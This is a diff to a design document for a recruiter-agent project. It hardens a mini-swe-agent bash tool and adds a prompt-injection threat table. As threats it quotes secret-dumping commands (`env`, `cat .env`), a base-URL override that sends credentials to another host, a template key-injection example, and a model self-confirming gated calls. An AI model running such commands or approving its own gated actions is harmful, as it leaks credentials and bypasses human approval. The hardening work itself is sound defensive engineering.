@@ -13,7 +13,7 @@ behave the same everywhere.
 | **LangGraph workflow** (`StateGraph`) | Recruiter pipelines whose steps are known in advance. Code picks every step, so an approval can't be skipped and id types can't be mixed up. | `run_workflow.py` |
 | **deepagents** | Long, multi-part work: many jobs, reports, research. Planning, subagents and scratch files are worth their token cost there, and only there. | `run_deepagent.py` |
 | **MCP server** | Reaching any other framework or tool (Claude Code, OpenAI Agents SDK, PydanticAI, …) without rewriting the tools. | `vira_mcp.py` |
-| mini-swe-agent | Baseline only. If it stays in use, close its shell exposure first (next section). | `run_mini.py` |
+| mini-swe-agent | Baseline only. Its "bash" now runs just `recruiter_cli` and `echo`, without a shell (next section). | `run_mini.py` |
 
 ## 1. Where we started: mini-swe-agent + bash
 
@@ -23,27 +23,45 @@ run_mini.py ─ DefaultAgent (yolo) ─ model writes a shell string ─ LocalEnv
 ```
 
 `recruiter_cli.py` already carries the domain weight: endpoint routing, the query-vs-body
-split, auth headers from env, `_mask_pii`, `_audit` and `NEEDS_CONFIRM`. The trouble is the bash tool itself:
+split, auth headers from env, `_mask_pii`, `_audit` and `NEEDS_CONFIRM`. The trouble was the bash
+tool itself. Each problem below and how it is closed now (§11 lists the tests):
 
-- **Secrets are one command away.** `LocalEnvironment` runs every command with
-  `env=os.environ | …` after `load_dotenv()`, in yolo mode. A single `env` or `cat .env` would put
-  credentials into model context, unmasked. Only the prompt prevents it.
-- **The model picks real vs mock.** It writes `--mode` itself and the CLI defaults to `real`;
-  `JENI_MODE` only changes the prompt text.
-- **Prompt rules that exist only to tame bash:** one command per turn, quoting `SUMMARY` so `|` isn't
-  a pipe, `echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT`, and `tool_choice="required"` to stop prose
-  turns that re-fired real API calls.
-- **The confirm gate has no human in it.** It expects the model to retry with `--confirmed` (no
-  such flag exists yet); nothing structurally requires approval.
-- Smaller sharp edges: mini renders `commands.md` with Jinja, with `os.environ` among the template
-  variables, so a `{{ VIRA_API_KEY }}` typed into `commands.md` would inject the key into the prompt.
-  Masking is by key name, so a non-JSON real-mode reply (`{"raw": text}`) passes through unmasked.
+- **Secrets were one command away.** mini's `LocalEnvironment` runs every command through
+  `subprocess(shell=True)` with `env=os.environ | …`, in the repo directory, and nothing ever asked
+  for confirmation (`mode: yolo` isn't a `DefaultAgent` setting at all). `env`, `cat .env`, or
+  `VIRA_BASE_URL=http://elsewhere python3 recruiter_cli.py …` would have put or sent credentials
+  out. litellm and minisweagent also call `load_dotenv()` on import, so the whole `.env` landed in
+  `os.environ` even without run_mini's own call.
+  **Now:** `run_mini.py` gives the model `mini_env.RecruiterEnvironment`. It accepts only what
+  `mini_policy.parse()` allows: `echo …` (answered in Python) and
+  `python3 recruiter_cli.py <subcommand> <flags>`, which runs as an argv list with this interpreter,
+  without a shell. Everything else, including `;`, pipes, redirection, `VAR=` prefixes and newlines,
+  comes back `Refused: …` and never runs. The child gets `PATH`, `LANG`, `EVENTS_LOG` and the
+  `VIRA_*` values only; the model provider's key and your shell's variables stay out. `.env`
+  loading is disabled before minisweagent and litellm are imported, and `run_mini` reads `.env`
+  itself.
+- **The model picked real vs mock.** It wrote `--mode` itself and the CLI defaulted to `real`.
+  **Now:** `--mode` is required by the CLI, and the environment adds the host's mode
+  (`JENI_MODE`, default `mock`). A different `--mode` from the model is refused. In real mode,
+  `score-candidates` and `candidate-insights` wait for a y/N at the terminal.
+- **Prompt rules that exist only to tame bash:** one command per turn, quoting `SUMMARY` (an unquoted
+  `|` is now refused rather than read as a pipe), `echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT`, and
+  `tool_choice="required"` to stop prose turns that re-fired real API calls. These remain; they
+  are the cost of the bash-shaped interface.
+- **The confirm gate has no human in it.** It told the model to retry with `--confirmed`, a flag
+  that doesn't exist. **Now:** the message says the agent can't approve, and `mini_policy` refuses
+  any `--confirmed`. A write command still needs an approval design (§10).
+- **Jinja saw the environment.** mini renders its prompt templates with `os.environ` among the
+  variables, so a `{{ VIRA_API_KEY }}` typed into `commands.md` would have put the key in the
+  prompt. **Now:** the system prompt is passed as a template variable, so `commands.md` is never
+  parsed, and the environment's template variables no longer include `os.environ`.
+- Masking is by key name, so a non-JSON real-mode reply (`{"raw": text}`) passes through unmasked.
 
 ## 2. One tool contract, many runtimes
 
 ```
 recruiter_cli.execute(…, mode=…)   gate → _call → _audit → _mask_pii      (one guarded path)
-   ├─ recruiter_cli CLI ────────── run_mini.py            (mini-swe-agent, unchanged)
+   ├─ recruiter_cli CLI ────────── run_mini.py            (mini-swe-agent, via mini_env: no shell)
    ├─ vira_tools.py (typed) ────┬─ run_langgraph.py       LangGraph agent loop (create_agent)
    │                            ├─ run_deepagent.py       deepagents harness
    │                            └─ vira_mcp.py (stdio)    any MCP client
@@ -59,7 +77,9 @@ recruiter_cli.execute(…, mode=…)   gate → _call → _audit → _mask_pii  
 | `vira_mcp.py` | The same tools over MCP. |
 | `compare_agents.py` | Live side-by-side on mock VIRA (section 7): `--model`, `--repeat`, `--json` traces. |
 | `grounding.py` | Traces every tool argument and answer id/score to the task or an earlier result, and flags ids of the wrong kind ([format](agent-frameworks-changes.md#6-trace-and-grounding-json)). |
-| `tests/` | 56 offline tests: mock VIRA, a scripted fake model, `.env` disabled, audit log in `tmp_path`. |
+| `mini_policy.py` | What mini's model may run: `echo …` or one `python3 recruiter_cli.py <subcommand>` call; everything else is refused. Stdlib only, shared by `mini_env`, `grounding` and `compare_agents`. |
+| `mini_env.py` | `RecruiterEnvironment`, mini's "bash" tool: runs what `mini_policy` allows as an argv list, with the host's mode and a minimal environment. |
+| `tests/` | 101 offline tests: mock VIRA, a scripted fake model, `.env` disabled, audit log in `tmp_path`. |
 
 Guarantees that hold in every new runtime:
 - Results are masked by `_mask_pii` before they reach the model, the graph state or the checkpointer.
@@ -247,7 +267,8 @@ audit log, i.e. what actually reached VIRA, not on the model's prose. Each cell 
 LLM runs aren't deterministic, so treat this as anecdotal. Cells show model calls · tokens ·
 wall time; costs are litellm price-table estimates.
 
-Run 2, with the current tool contract:
+Run 2, with the current tool contract. Both runs predate the security hardening in §11 (mini's
+confined environment, and the guards and approvals added after it); re-run before comparing.
 
 | task | check | mini | LangGraph | deepagents |
 |---|---|---|---|---|
@@ -307,8 +328,9 @@ What the runs showed:
 
 ```bash
 uv pip install -r requirements-dev.txt
-.venv/bin/python -m pytest -q                                   # offline, 56 tests
+.venv/bin/python -m pytest -q                                   # offline, 101 tests
 
+JENI_MODE=mock python run_mini.py                                         # mini baseline, no shell
 python run_langgraph.py --task "Find potential talents for job 123"       # mock VIRA by default
 python run_langgraph.py --approve-all                                     # approve/edit/reject each call
 python run_workflow.py --app-ids 11,12,13 --top 2
@@ -328,8 +350,6 @@ prompts and (masked) tool results off the machine.
   `vira_tools` passes `confirmed=True` only for tools that `agent_kit` gates with `interrupt_on`,
   asserted at build time for the main agent and every subagent. MCP keeps them off, or uses
   elicitation.
-- **mini, if it stays:** give `LocalEnvironment` a filtered env instead of `os.environ`, run it from
-  a directory without `.env`, and make `--mode` come from the host, not the model.
 - **get-match-id:** the `id_trap` task shows the gap: without it, scoring suggested talents
   can't be done correctly.
 - **Durable approvals:** `SqliteSaver` (langgraph-checkpoint-sqlite) so a paused run survives a
@@ -343,3 +363,21 @@ prompts and (masked) tool results off the machine.
   tuned and evaluated on.
 - **Trace UI:** LangGraph Studio / LangSmith, if the team wants it and accepts data leaving the
   machine.
+
+## 11. Security model
+
+The threat that shapes everything here is **prompt injection**: the task text, and VIRA results
+built from candidate data (CV-derived insight summaries, generated JD text), reach the model. So
+every control sits in code the model can't reach, and each one has a test.
+
+| Threat | Control | Tests |
+|---|---|---|
+| mini's model runs arbitrary shell commands (`env`, `cat .env`, `VAR=… python3 recruiter_cli.py`, chained or multi-line commands) | `mini_env.RecruiterEnvironment` runs only what `mini_policy.parse()` accepts: `echo` (answered in Python) and `python3 recruiter_cli.py <subcommand>` as an argv list, with no shell; the rest is refused before anything starts | `test_mini_env.py`: `test_everything_else_is_refused`, `test_refused_commands_never_start_a_process` |
+| Secrets reach mini's commands or prompt templates | The child env is `PATH`/`LANG`/`EVENTS_LOG` plus `VIRA_*` passed as `secrets` (kept off the config); template variables exclude `os.environ`; `.env` loading is disabled before minisweagent and litellm import, and `run_mini` reads `.env` itself | `test_cli_runs_as_argv_with_the_host_mode_and_a_minimal_env`, `test_secrets_stay_out_of_templates_and_serialisation` |
+| The model chooses real mode | `--mode` is required by the CLI; mini's environment adds the host's mode (`JENI_MODE`, default mock) and refuses a different one, including argparse abbreviations | `test_mode_is_required`, `test_allowed_commands`, `test_everything_else_is_refused` |
+| VIRA output ends mini's run early | `COMPLETE_TASK…` is honoured only from `echo`, never from recruiter_cli output | `test_echo_complete_ends_the_run_but_vira_output_cannot` |
+| Side effects in real mode (mini) | `score-candidates`/`candidate-insights` wait for a y/N; with no approver they are refused | `test_real_mode_side_effects_wait_for_approval`, `test_real_mode_without_an_approver_refuses_side_effects` |
+| The model self-confirms a gated command | `mini_policy` refuses `--confirmed`; the gate's message says the agent can't approve | `test_everything_else_is_refused`, `test_confirm_gate_blocks_before_any_call` |
+| Tracebacks put hosts and paths into mini's context | Only argparse's error line is returned on failure | `test_argparse_errors_reach_the_model_but_tracebacks_do_not` |
+| A chained command's output lands in traces | `grounding.parse_cli` uses `mini_policy`, so such a call is off-policy and its output hidden | `test_a_vira_call_chained_to_another_command_is_off_policy` |
+| `commands.md` parsed as a template (SSTI, key injection) | The system prompt is passed as a template variable; Jinja never parses `commands.md` | smoke-tested; `run_mini` is kept out of the offline suite |
